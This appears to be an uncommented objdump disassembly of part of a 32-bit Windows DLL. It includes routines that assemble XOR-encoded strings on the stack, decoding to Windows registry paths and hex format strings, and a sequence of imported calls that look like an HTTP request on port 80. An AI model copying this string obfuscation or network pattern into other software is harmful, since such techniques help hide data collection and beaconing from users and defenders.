10003eea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10003ef0:	50                   	push   %eax
10003ef1:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10003ef8:	83 ec 30             	sub    $0x30,%esp
10003efb:	53                   	push   %ebx
10003efc:	56                   	push   %esi
10003efd:	57                   	push   %edi
10003efe:	89 65 e8             	mov    %esp,-0x18(%ebp)
10003f01:	33 f6                	xor    %esi,%esi
10003f03:	89 75 d8             	mov    %esi,-0x28(%ebp)
10003f06:	89 75 e0             	mov    %esi,-0x20(%ebp)
10003f09:	89 75 d4             	mov    %esi,-0x2c(%ebp)
10003f0c:	89 75 dc             	mov    %esi,-0x24(%ebp)
10003f0f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10003f12:	89 75 fc             	mov    %esi,-0x4(%ebp)
10003f15:	6a 01                	push   $0x1
10003f17:	58                   	pop    %eax
10003f18:	89 45 fc             	mov    %eax,-0x4(%ebp)
10003f1b:	89 75 cc             	mov    %esi,-0x34(%ebp)
10003f1e:	50                   	push   %eax
10003f1f:	68 24 01 01 10       	push   $0x10010124
10003f24:	8d 45 cc             	lea    -0x34(%ebp),%eax
10003f27:	50                   	push   %eax
10003f28:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10003f2b:	50                   	push   %eax
10003f2c:	ff 75 0c             	push   0xc(%ebp)
10003f2f:	e8 da 02 00 00       	call   0x1000420e
10003f34:	89 75 dc             	mov    %esi,-0x24(%ebp)
10003f37:	89 75 d0             	mov    %esi,-0x30(%ebp)
10003f3a:	ff 75 14             	push   0x14(%ebp)
10003f3d:	ff 75 1c             	push   0x1c(%ebp)
10003f40:	ff 75 18             	push   0x18(%ebp)
10003f43:	ff 75 e4             	push   -0x1c(%ebp)
10003f46:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003f49:	50                   	push   %eax
10003f4a:	8d 45 dc             	lea    -0x24(%ebp),%eax
10003f4d:	50                   	push   %eax
10003f4e:	e8 06 01 00 00       	call   0x10004059
10003f53:	83 c4 2c             	add    $0x2c,%esp
10003f56:	0f b6 c0             	movzbl %al,%eax
10003f59:	89 45 c4             	mov    %eax,-0x3c(%ebp)
10003f5c:	3b c6                	cmp    %esi,%eax
10003f5e:	75 09                	jne    0x10003f69
10003f60:	c7 45 d8 9b e4 ff ff 	movl   $0xffffe49b,-0x28(%ebp)
10003f67:	eb 77                	jmp    0x10003fe0
10003f69:	56                   	push   %esi
10003f6a:	56                   	push   %esi
10003f6b:	6a 03                	push   $0x3
10003f6d:	b8 6c 07 01 10       	mov    $0x1001076c,%eax
10003f72:	50                   	push   %eax
10003f73:	50                   	push   %eax
10003f74:	6a 50                	push   $0x50
10003f76:	ff 75 0c             	push   0xc(%ebp)
10003f79:	ff 75 08             	push   0x8(%ebp)
10003f7c:	ff 15 70 07 01 10    	call   *0x10010770
10003f82:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003f85:	3b c6                	cmp    %esi,%eax
10003f87:	75 09                	jne    0x10003f92
10003f89:	c7 45 d8 99 e4 ff ff 	movl   $0xffffe499,-0x28(%ebp)
10003f90:	eb 4e                	jmp    0x10003fe0
10003f92:	56                   	push   %esi
10003f93:	68 00 00 00 04       	push   $0x4000000
10003f98:	56                   	push   %esi
10003f99:	56                   	push   %esi
10003f9a:	68 18 01 01 10       	push   $0x10010118
10003f9f:	ff 75 dc             	push   -0x24(%ebp)
10003fa2:	68 14 01 01 10       	push   $0x10010114
10003fa7:	50                   	push   %eax
10003fa8:	ff 15 74 07 01 10    	call   *0x10010774
10003fae:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10003fb1:	3b c6                	cmp    %esi,%eax
10003fb3:	75 09                	jne    0x10003fbe
10003fb5:	c7 45 d8 98 e4 ff ff 	movl   $0xffffe498,-0x28(%ebp)
10003fbc:	eb 22                	jmp    0x10003fe0
10003fbe:	56                   	push   %esi
10003fbf:	56                   	push   %esi
10003fc0:	56                   	push   %esi
10003fc1:	56                   	push   %esi
10003fc2:	50                   	push   %eax
10003fc3:	ff 15 78 07 01 10    	call   *0x10010778
10003fc9:	89 45 c8             	mov    %eax,-0x38(%ebp)
10003fcc:	3b c6                	cmp    %esi,%eax
10003fce:	75 10                	jne    0x10003fe0
10003fd0:	ff 15 60 e1 00 10    	call   *0x1000e160
10003fd6:	89 45 c0             	mov    %eax,-0x40(%ebp)
10003fd9:	c7 45 d8 97 e4 ff ff 	movl   $0xffffe497,-0x28(%ebp)
10003fe0:	89 75 fc             	mov    %esi,-0x4(%ebp)
10003fe3:	e8 04 00 00 00       	call   0x10003fec
10003fe8:	eb 59                	jmp    0x10004043
10003fea:	33 f6                	xor    %esi,%esi
10003fec:	39 75 dc             	cmp    %esi,-0x24(%ebp)
10003fef:	74 0d                	je     0x10003ffe
10003ff1:	ff 75 dc             	push   -0x24(%ebp)
10003ff4:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10003ffa:	59                   	pop    %ecx
10003ffb:	89 75 dc             	mov    %esi,-0x24(%ebp)
10003ffe:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
10004001:	74 0d                	je     0x10004010
10004003:	ff 75 e4             	push   -0x1c(%ebp)
10004006:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000400c:	59                   	pop    %ecx
1000400d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10004010:	39 75 e0             	cmp    %esi,-0x20(%ebp)
10004013:	74 0c                	je     0x10004021
10004015:	ff 75 e0             	push   -0x20(%ebp)
10004018:	ff 15 80 07 01 10    	call   *0x10010780
1000401e:	89 75 e0             	mov    %esi,-0x20(%ebp)
10004021:	39 75 d4             	cmp    %esi,-0x2c(%ebp)
10004024:	74 0c                	je     0x10004032
10004026:	ff 75 d4             	push   -0x2c(%ebp)
10004029:	ff 15 80 07 01 10    	call   *0x10010780
1000402f:	89 75 d4             	mov    %esi,-0x2c(%ebp)
10004032:	c3                   	ret
10004033:	eb 0e                	jmp    0x10004043
10004035:	6a 01                	push   $0x1
10004037:	58                   	pop    %eax
10004038:	c3                   	ret
10004039:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000403c:	c7 45 d8 96 e4 ff ff 	movl   $0xffffe496,-0x28(%ebp)
10004043:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10004047:	8b 45 d8             	mov    -0x28(%ebp),%eax
1000404a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000404d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10004054:	5f                   	pop    %edi
10004055:	5e                   	pop    %esi
10004056:	5b                   	pop    %ebx
10004057:	c9                   	leave
10004058:	c3                   	ret
10004059:	55                   	push   %ebp
1000405a:	8b ec                	mov    %esp,%ebp
1000405c:	6a ff                	push   $0xffffffff
1000405e:	68 28 e3 00 10       	push   $0x1000e328
10004063:	68 00 c6 00 10       	push   $0x1000c600
10004068:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000406e:	50                   	push   %eax
1000406f:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10004076:	83 ec 40             	sub    $0x40,%esp
10004079:	53                   	push   %ebx
1000407a:	56                   	push   %esi
1000407b:	57                   	push   %edi
1000407c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000407f:	c6 45 e4 01          	movb   $0x1,-0x1c(%ebp)
10004083:	c6 45 d8 5a          	movb   $0x5a,-0x28(%ebp)
10004087:	c6 45 d9 5a          	movb   $0x5a,-0x27(%ebp)
1000408b:	80 65 da 00          	andb   $0x0,-0x26(%ebp)
1000408f:	c6 45 c4 5a          	movb   $0x5a,-0x3c(%ebp)
10004093:	c6 45 c5 4f          	movb   $0x4f,-0x3b(%ebp)
10004097:	c6 45 c6 47          	movb   $0x47,-0x3a(%ebp)
1000409b:	c6 45 c7 07          	movb   $0x7,-0x39(%ebp)
1000409f:	c6 45 c8 5a          	movb   $0x5a,-0x38(%ebp)
100040a3:	c6 45 c9 4f          	movb   $0x4f,-0x37(%ebp)
100040a7:	c6 45 ca 47          	movb   $0x47,-0x36(%ebp)
100040ab:	c6 45 cb 07          	movb   $0x7,-0x35(%ebp)
100040af:	80 65 cc 00          	andb   $0x0,-0x34(%ebp)
100040b3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100040b7:	8d 45 d8             	lea    -0x28(%ebp),%eax
100040ba:	50                   	push   %eax
100040bb:	e8 2e 35 00 00       	call   0x100075ee
100040c0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
100040c3:	50                   	push   %eax
100040c4:	e8 25 35 00 00       	call   0x100075ee
100040c9:	ff 75 1c             	push   0x1c(%ebp)
100040cc:	e8 8f 92 00 00       	call   0x1000d360
100040d1:	8b f0                	mov    %eax,%esi
100040d3:	89 75 e0             	mov    %esi,-0x20(%ebp)
100040d6:	ff 75 10             	push   0x10(%ebp)
100040d9:	e8 82 92 00 00       	call   0x1000d360
100040de:	8b d8                	mov    %eax,%ebx
100040e0:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
100040e3:	8d 45 d8             	lea    -0x28(%ebp),%eax
100040e6:	50                   	push   %eax
100040e7:	e8 74 92 00 00       	call   0x1000d360
100040ec:	89 45 dc             	mov    %eax,-0x24(%ebp)
100040ef:	03 c3                	add    %ebx,%eax
100040f1:	8d 44 30 10          	lea    0x10(%eax,%esi,1),%eax
100040f5:	8b 7d 0c             	mov    0xc(%ebp),%edi
100040f8:	89 07                	mov    %eax,(%edi)
100040fa:	40                   	inc    %eax
100040fb:	50                   	push   %eax
100040fc:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10004102:	83 c4 18             	add    $0x18,%esp
10004105:	8b 75 08             	mov    0x8(%ebp),%esi
10004108:	89 06                	mov    %eax,(%esi)
1000410a:	85 f6                	test   %esi,%esi
1000410c:	75 0e                	jne    0x1000411c
1000410e:	ff 15 60 e1 00 10    	call   *0x1000e160
10004114:	89 45 18             	mov    %eax,0x18(%ebp)
10004117:	e9 96 00 00 00       	jmp    0x100041b2
1000411c:	6a 11                	push   $0x11
1000411e:	6a 00                	push   $0x0
10004120:	8d 45 b0             	lea    -0x50(%ebp),%eax
10004123:	50                   	push   %eax
10004124:	e8 ed 91 00 00       	call   0x1000d316
10004129:	83 c4 0c             	add    $0xc,%esp
1000412c:	ff 75 18             	push   0x18(%ebp)
1000412f:	e8 9a 8a 00 00       	call   0x1000cbce
10004134:	50                   	push   %eax
10004135:	ff 75 14             	push   0x14(%ebp)
10004138:	e8 91 8a 00 00       	call   0x1000cbce
1000413d:	50                   	push   %eax
1000413e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10004141:	50                   	push   %eax
10004142:	6a 10                	push   $0x10
10004144:	8d 45 b0             	lea    -0x50(%ebp),%eax
10004147:	50                   	push   %eax
10004148:	ff 15 d4 e1 00 10    	call   *0x1000e1d4
1000414e:	8b 07                	mov    (%edi),%eax
10004150:	40                   	inc    %eax
10004151:	50                   	push   %eax
10004152:	6a 00                	push   $0x0
10004154:	ff 36                	push   (%esi)
10004156:	e8 bb 91 00 00       	call   0x1000d316
1000415b:	ff 37                	push   (%edi)
1000415d:	ff 75 10             	push   0x10(%ebp)
10004160:	ff 36                	push   (%esi)
10004162:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004168:	8b 07                	mov    (%edi),%eax
1000416a:	2b c3                	sub    %ebx,%eax
1000416c:	50                   	push   %eax
1000416d:	ff 75 1c             	push   0x1c(%ebp)
10004170:	ff 36                	push   (%esi)
10004172:	8b 1d cc e1 00 10    	mov    0x1000e1cc,%ebx
10004178:	ff d3                	call   *%ebx
1000417a:	8b 07                	mov    (%edi),%eax
1000417c:	2b 45 d4             	sub    -0x2c(%ebp),%eax
1000417f:	2b 45 e0             	sub    -0x20(%ebp),%eax
10004182:	50                   	push   %eax
10004183:	8d 45 d8             	lea    -0x28(%ebp),%eax
10004186:	50                   	push   %eax
10004187:	ff 36                	push   (%esi)
10004189:	ff d3                	call   *%ebx
1000418b:	83 c4 44             	add    $0x44,%esp
1000418e:	8b 07                	mov    (%edi),%eax
10004190:	2b 45 dc             	sub    -0x24(%ebp),%eax
10004193:	2b 45 d4             	sub    -0x2c(%ebp),%eax
10004196:	2b 45 e0             	sub    -0x20(%ebp),%eax
10004199:	50                   	push   %eax
1000419a:	8d 45 b0             	lea    -0x50(%ebp),%eax
1000419d:	50                   	push   %eax
1000419e:	ff 36                	push   (%esi)
100041a0:	ff d3                	call   *%ebx
100041a2:	83 c4 0c             	add    $0xc,%esp
100041a5:	eb 0b                	jmp    0x100041b2
100041a7:	6a 01                	push   $0x1
100041a9:	58                   	pop    %eax
100041aa:	c3                   	ret
100041ab:	8b 65 e8             	mov    -0x18(%ebp),%esp
100041ae:	80 65 e4 00          	andb   $0x0,-0x1c(%ebp)
100041b2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100041b6:	8a 45 e4             	mov    -0x1c(%ebp),%al
100041b9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100041bc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100041c3:	5f                   	pop    %edi
100041c4:	5e                   	pop    %esi
100041c5:	5b                   	pop    %ebx
100041c6:	c9                   	leave
100041c7:	c3                   	ret
100041c8:	55                   	push   %ebp
100041c9:	8b ec                	mov    %esp,%ebp
100041cb:	83 ec 10             	sub    $0x10,%esp
100041ce:	8d 45 f0             	lea    -0x10(%ebp),%eax
100041d1:	50                   	push   %eax
100041d2:	ff 15 a4 e0 00 10    	call   *0x1000e0a4
100041d8:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
100041dc:	6a 0a                	push   $0xa
100041de:	99                   	cltd
100041df:	59                   	pop    %ecx
100041e0:	f7 f9                	idiv   %ecx
100041e2:	8b c2                	mov    %edx,%eax
100041e4:	c9                   	leave
100041e5:	c3                   	ret
100041e6:	55                   	push   %ebp
100041e7:	8b ec                	mov    %esp,%ebp
100041e9:	51                   	push   %ecx
100041ea:	e8 d9 ff ff ff       	call   0x100041c8
100041ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
100041f2:	db 45 fc             	fildl  -0x4(%ebp)
100041f5:	dc 05 48 e3 00 10    	faddl  0x1000e348
100041fb:	dc 0d 40 e3 00 10    	fmull  0x1000e340
10004201:	dc 0d 38 e3 00 10    	fmull  0x1000e338
10004207:	e8 b2 92 00 00       	call   0x1000d4be
1000420c:	c9                   	leave
1000420d:	c3                   	ret
1000420e:	55                   	push   %ebp
1000420f:	8b ec                	mov    %esp,%ebp
10004211:	6a ff                	push   $0xffffffff
10004213:	68 50 e3 00 10       	push   $0x1000e350
10004218:	68 00 c6 00 10       	push   $0x1000c600
1000421d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10004223:	50                   	push   %eax
10004224:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000422b:	83 ec 1c             	sub    $0x1c,%esp
1000422e:	53                   	push   %ebx
1000422f:	56                   	push   %esi
10004230:	57                   	push   %edi
10004231:	89 65 e8             	mov    %esp,-0x18(%ebp)
10004234:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
1000423b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000423f:	8b 7d 08             	mov    0x8(%ebp),%edi
10004242:	85 ff                	test   %edi,%edi
10004244:	74 5a                	je     0x100042a0
10004246:	ff 75 14             	push   0x14(%ebp)
10004249:	57                   	push   %edi
1000424a:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
10004250:	59                   	pop    %ecx
10004251:	59                   	pop    %ecx
10004252:	89 45 d8             	mov    %eax,-0x28(%ebp)
10004255:	85 c0                	test   %eax,%eax
10004257:	74 47                	je     0x100042a0
10004259:	2b c7                	sub    %edi,%eax
1000425b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000425e:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
10004262:	75 0e                	jne    0x10004272
10004264:	ff 75 14             	push   0x14(%ebp)
10004267:	e8 f4 90 00 00       	call   0x1000d360
1000426c:	59                   	pop    %ecx
1000426d:	03 45 d4             	add    -0x2c(%ebp),%eax
10004270:	eb 03                	jmp    0x10004275
10004272:	8b 45 d4             	mov    -0x2c(%ebp),%eax
10004275:	89 45 dc             	mov    %eax,-0x24(%ebp)
10004278:	57                   	push   %edi
10004279:	e8 e2 90 00 00       	call   0x1000d360
1000427e:	8b f0                	mov    %eax,%esi
10004280:	2b 75 dc             	sub    -0x24(%ebp),%esi
10004283:	89 75 e0             	mov    %esi,-0x20(%ebp)
10004286:	8b 45 10             	mov    0x10(%ebp),%eax
10004289:	89 30                	mov    %esi,(%eax)
1000428b:	8d 46 01             	lea    0x1(%esi),%eax
1000428e:	50                   	push   %eax
1000428f:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10004295:	59                   	pop    %ecx
10004296:	59                   	pop    %ecx
10004297:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000429a:	89 03                	mov    %eax,(%ebx)
1000429c:	85 c0                	test   %eax,%eax
1000429e:	75 08                	jne    0x100042a8
100042a0:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100042a4:	33 c0                	xor    %eax,%eax
100042a6:	eb 39                	jmp    0x100042e1
100042a8:	8d 4e 01             	lea    0x1(%esi),%ecx
100042ab:	51                   	push   %ecx
100042ac:	6a 00                	push   $0x0
100042ae:	50                   	push   %eax
100042af:	e8 62 90 00 00       	call   0x1000d316
100042b4:	56                   	push   %esi
100042b5:	8b 45 dc             	mov    -0x24(%ebp),%eax
100042b8:	03 c7                	add    %edi,%eax
100042ba:	50                   	push   %eax
100042bb:	ff 33                	push   (%ebx)
100042bd:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
100042c3:	83 c4 18             	add    $0x18,%esp
100042c6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
100042c9:	80 24 38 00          	andb   $0x0,(%eax,%edi,1)
100042cd:	eb 0b                	jmp    0x100042da
100042cf:	6a 01                	push   $0x1
100042d1:	58                   	pop    %eax
100042d2:	c3                   	ret
100042d3:	8b 65 e8             	mov    -0x18(%ebp),%esp
100042d6:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
100042da:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100042de:	8b 45 e4             	mov    -0x1c(%ebp),%eax
100042e1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100042e4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100042eb:	5f                   	pop    %edi
100042ec:	5e                   	pop    %esi
100042ed:	5b                   	pop    %ebx
100042ee:	c9                   	leave
100042ef:	c3                   	ret
100042f0:	55                   	push   %ebp
100042f1:	8b ec                	mov    %esp,%ebp
100042f3:	81 ec 08 02 00 00    	sub    $0x208,%esp
100042f9:	53                   	push   %ebx
100042fa:	56                   	push   %esi
100042fb:	b8 ff 00 00 00       	mov    $0xff,%eax
10004300:	be 00 01 00 00       	mov    $0x100,%esi
10004305:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004308:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000430b:	56                   	push   %esi
1000430c:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
10004312:	6a 00                	push   $0x0
10004314:	50                   	push   %eax
10004315:	32 db                	xor    %bl,%bl
10004317:	e8 fa 8f 00 00       	call   0x1000d316
1000431c:	56                   	push   %esi
1000431d:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10004323:	6a 00                	push   $0x0
10004325:	50                   	push   %eax
10004326:	e8 eb 8f 00 00       	call   0x1000d316
1000432b:	83 c4 18             	add    $0x18,%esp
1000432e:	e8 d2 2a 00 00       	call   0x10006e05
10004333:	85 c0                	test   %eax,%eax
10004335:	75 04                	jne    0x1000433b
10004337:	b0 01                	mov    $0x1,%al
10004339:	eb 6d                	jmp    0x100043a8
1000433b:	e8 de 3e 00 00       	call   0x1000821e
10004340:	8d 45 f8             	lea    -0x8(%ebp),%eax
10004343:	50                   	push   %eax
10004344:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
1000434a:	50                   	push   %eax
1000434b:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000434e:	50                   	push   %eax
1000434f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
10004355:	50                   	push   %eax
10004356:	e8 33 35 00 00       	call   0x1000788e
1000435b:	83 c4 10             	add    $0x10,%esp
1000435e:	85 c0                	test   %eax,%eax
10004360:	75 2a                	jne    0x1000438c
10004362:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10004368:	50                   	push   %eax
10004369:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
1000436f:	83 f8 14             	cmp    $0x14,%eax
10004372:	7e 18                	jle    0x1000438c
10004374:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
1000437a:	50                   	push   %eax
1000437b:	e8 ae 3a 00 00       	call   0x10007e2e
10004380:	8b d8                	mov    %eax,%ebx
10004382:	59                   	pop    %ecx
10004383:	4b                   	dec    %ebx
10004384:	f7 db                	neg    %ebx
10004386:	1a db                	sbb    %bl,%bl
10004388:	fe c3                	inc    %bl
1000438a:	eb 11                	jmp    0x1000439d
1000438c:	e8 cc 3d 00 00       	call   0x1000815d
10004391:	83 f8 01             	cmp    $0x1,%eax
10004394:	75 10                	jne    0x100043a6
10004396:	e8 ae 3b 00 00       	call   0x10007f49
1000439b:	b3 01                	mov    $0x1,%bl
1000439d:	84 db                	test   %bl,%bl
1000439f:	74 05                	je     0x100043a6
100043a1:	e8 06 00 00 00       	call   0x100043ac
100043a6:	8a c3                	mov    %bl,%al
100043a8:	5e                   	pop    %esi
100043a9:	5b                   	pop    %ebx
100043aa:	c9                   	leave
100043ab:	c3                   	ret
100043ac:	56                   	push   %esi
100043ad:	33 f6                	xor    %esi,%esi
100043af:	56                   	push   %esi
100043b0:	56                   	push   %esi
100043b1:	6a 27                	push   $0x27
100043b3:	56                   	push   %esi
100043b4:	ff 15 8c 07 01 10    	call   *0x1001078c
100043ba:	56                   	push   %esi
100043bb:	56                   	push   %esi
100043bc:	6a 25                	push   $0x25
100043be:	56                   	push   %esi
100043bf:	ff 15 8c 07 01 10    	call   *0x1001078c
100043c5:	68 e8 03 00 00       	push   $0x3e8
100043ca:	ff 15 24 e1 00 10    	call   *0x1000e124
100043d0:	5e                   	pop    %esi
100043d1:	c3                   	ret
100043d2:	55                   	push   %ebp
100043d3:	8b ec                	mov    %esp,%ebp
100043d5:	6a ff                	push   $0xffffffff
100043d7:	68 60 e3 00 10       	push   $0x1000e360
100043dc:	68 00 c6 00 10       	push   $0x1000c600
100043e1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100043e7:	50                   	push   %eax
100043e8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100043ef:	81 ec 0c 03 00 00    	sub    $0x30c,%esp
100043f5:	53                   	push   %ebx
100043f6:	56                   	push   %esi
100043f7:	57                   	push   %edi
100043f8:	89 65 e8             	mov    %esp,-0x18(%ebp)
100043fb:	be 00 10 00 00       	mov    $0x1000,%esi
10004400:	89 75 b4             	mov    %esi,-0x4c(%ebp)
10004403:	33 db                	xor    %ebx,%ebx
10004405:	88 5d b8             	mov    %bl,-0x48(%ebp)
10004408:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
1000440e:	89 9d 2c ff ff ff    	mov    %ebx,-0xd4(%ebp)
10004414:	89 9d 6c ff ff ff    	mov    %ebx,-0x94(%ebp)
1000441a:	89 9d 74 ff ff ff    	mov    %ebx,-0x8c(%ebp)
10004420:	89 9d 30 ff ff ff    	mov    %ebx,-0xd0(%ebp)
10004426:	c6 85 50 ff ff ff 5a 	movb   $0x5a,-0xb0(%ebp)
1000442d:	c6 85 51 ff ff ff 5a 	movb   $0x5a,-0xaf(%ebp)
10004434:	88 9d 52 ff ff ff    	mov    %bl,-0xae(%ebp)
1000443a:	c6 85 34 ff ff ff 4f 	movb   $0x4f,-0xcc(%ebp)
10004441:	c6 85 35 ff ff ff 4e 	movb   $0x4e,-0xcb(%ebp)
10004448:	c6 85 36 ff ff ff 4f 	movb   $0x4f,-0xca(%ebp)
1000444f:	c6 85 37 ff ff ff 4f 	movb   $0x4f,-0xc9(%ebp)
10004456:	c6 85 38 ff ff ff 4f 	movb   $0x4f,-0xc8(%ebp)
1000445d:	c6 85 39 ff ff ff 4f 	movb   $0x4f,-0xc7(%ebp)
10004464:	c6 85 3a ff ff ff 4f 	movb   $0x4f,-0xc6(%ebp)
1000446b:	c6 85 3b ff ff ff 4f 	movb   $0x4f,-0xc5(%ebp)
10004472:	c6 85 3c ff ff ff 5a 	movb   $0x5a,-0xc4(%ebp)
10004479:	c6 85 3d ff ff ff 5a 	movb   $0x5a,-0xc3(%ebp)
10004480:	88 9d 3e ff ff ff    	mov    %bl,-0xc2(%ebp)
10004486:	c6 85 78 ff ff ff 4f 	movb   $0x4f,-0x88(%ebp)
1000448d:	c6 85 79 ff ff ff 4f 	movb   $0x4f,-0x87(%ebp)
10004494:	c6 85 7a ff ff ff 4f 	movb   $0x4f,-0x86(%ebp)
1000449b:	c6 85 7b ff ff ff 4f 	movb   $0x4f,-0x85(%ebp)
100044a2:	c6 85 7c ff ff ff 4f 	movb   $0x4f,-0x84(%ebp)
100044a9:	c6 85 7d ff ff ff 4f 	movb   $0x4f,-0x83(%ebp)
100044b0:	c6 85 7e ff ff ff 4f 	movb   $0x4f,-0x82(%ebp)
100044b7:	c6 85 7f ff ff ff 4f 	movb   $0x4f,-0x81(%ebp)
100044be:	c6 45 80 5a          	movb   $0x5a,-0x80(%ebp)
100044c2:	c6 45 81 5a          	movb   $0x5a,-0x7f(%ebp)
100044c6:	88 5d 82             	mov    %bl,-0x7e(%ebp)
100044c9:	c6 45 84 2c          	movb   $0x2c,-0x7c(%ebp)
100044cd:	c6 45 85 30          	movb   $0x30,-0x7b(%ebp)
100044d1:	c6 45 86 39          	movb   $0x39,-0x7a(%ebp)
100044d5:	c6 45 87 2b          	movb   $0x2b,-0x79(%ebp)
100044d9:	c6 45 88 28          	movb   $0x28,-0x78(%ebp)
100044dd:	c6 45 89 3e          	movb   $0x3e,-0x77(%ebp)
100044e1:	c6 45 8a 2d          	movb   $0x2d,-0x76(%ebp)
100044e5:	c6 45 8b 3a          	movb   $0x3a,-0x75(%ebp)
100044e9:	c6 45 8c 23          	movb   $0x23,-0x74(%ebp)
100044ed:	c6 45 8d 32          	movb   $0x32,-0x73(%ebp)
100044f1:	c6 45 8e 16          	movb   $0x16,-0x72(%ebp)
100044f5:	c6 45 8f 1c          	movb   $0x1c,-0x71(%ebp)
100044f9:	c6 45 90 0d          	movb   $0xd,-0x70(%ebp)
100044fd:	c6 45 91 10          	movb   $0x10,-0x6f(%ebp)
10004501:	c6 45 92 0c          	movb   $0xc,-0x6e(%ebp)
10004505:	c6 45 93 10          	movb   $0x10,-0x6d(%ebp)
10004509:	c6 45 94 19          	movb   $0x19,-0x6c(%ebp)
1000450d:	c6 45 95 0b          	movb   $0xb,-0x6b(%ebp)
10004511:	c6 45 96 23          	movb   $0x23,-0x6a(%ebp)
10004515:	c6 45 97 28          	movb   $0x28,-0x69(%ebp)
10004519:	c6 45 98 16          	movb   $0x16,-0x68(%ebp)
1000451d:	c6 45 99 11          	movb   $0x11,-0x67(%ebp)
10004521:	c6 45 9a 1b          	movb   $0x1b,-0x66(%ebp)
10004525:	c6 45 9b 10          	movb   $0x10,-0x65(%ebp)
10004529:	c6 45 9c 08          	movb   $0x8,-0x64(%ebp)
1000452d:	c6 45 9d 0c          	movb   $0xc,-0x63(%ebp)
10004531:	c6 45 9e 5f          	movb   $0x5f,-0x62(%ebp)
10004535:	c6 45 9f 31          	movb   $0x31,-0x61(%ebp)
10004539:	c6 45 a0 2b          	movb   $0x2b,-0x60(%ebp)
1000453d:	c6 45 a1 23          	movb   $0x23,-0x5f(%ebp)
10004541:	c6 45 a2 3c          	movb   $0x3c,-0x5e(%ebp)
10004545:	c6 45 a3 0a          	movb   $0xa,-0x5d(%ebp)
10004549:	c6 45 a4 0d          	movb   $0xd,-0x5c(%ebp)
1000454d:	c6 45 a5 0d          	movb   $0xd,-0x5b(%ebp)
10004551:	c6 45 a6 1a          	movb   $0x1a,-0x5a(%ebp)
10004555:	c6 45 a7 11          	movb   $0x11,-0x59(%ebp)
10004559:	c6 45 a8 0b          	movb   $0xb,-0x58(%ebp)
1000455d:	c6 45 a9 29          	movb   $0x29,-0x57(%ebp)
10004561:	c6 45 aa 1a          	movb   $0x1a,-0x56(%ebp)
10004565:	c6 45 ab 0d          	movb   $0xd,-0x55(%ebp)
10004569:	c6 45 ac 0c          	movb   $0xc,-0x54(%ebp)
1000456d:	c6 45 ad 16          	movb   $0x16,-0x53(%ebp)
10004571:	c6 45 ae 10          	movb   $0x10,-0x52(%ebp)
10004575:	c6 45 af 11          	movb   $0x11,-0x51(%ebp)
10004579:	c6 45 b0 23          	movb   $0x23,-0x50(%ebp)
1000457d:	88 5d b1             	mov    %bl,-0x4f(%ebp)
10004580:	c6 45 bc 2c          	movb   $0x2c,-0x44(%ebp)
10004584:	c6 45 bd 30          	movb   $0x30,-0x43(%ebp)
10004588:	c6 45 be 39          	movb   $0x39,-0x42(%ebp)
1000458c:	c6 45 bf 2b          	movb   $0x2b,-0x41(%ebp)
10004590:	c6 45 c0 28          	movb   $0x28,-0x40(%ebp)
10004594:	c6 45 c1 3e          	movb   $0x3e,-0x3f(%ebp)
10004598:	c6 45 c2 2d          	movb   $0x2d,-0x3e(%ebp)
1000459c:	c6 45 c3 3a          	movb   $0x3a,-0x3d(%ebp)
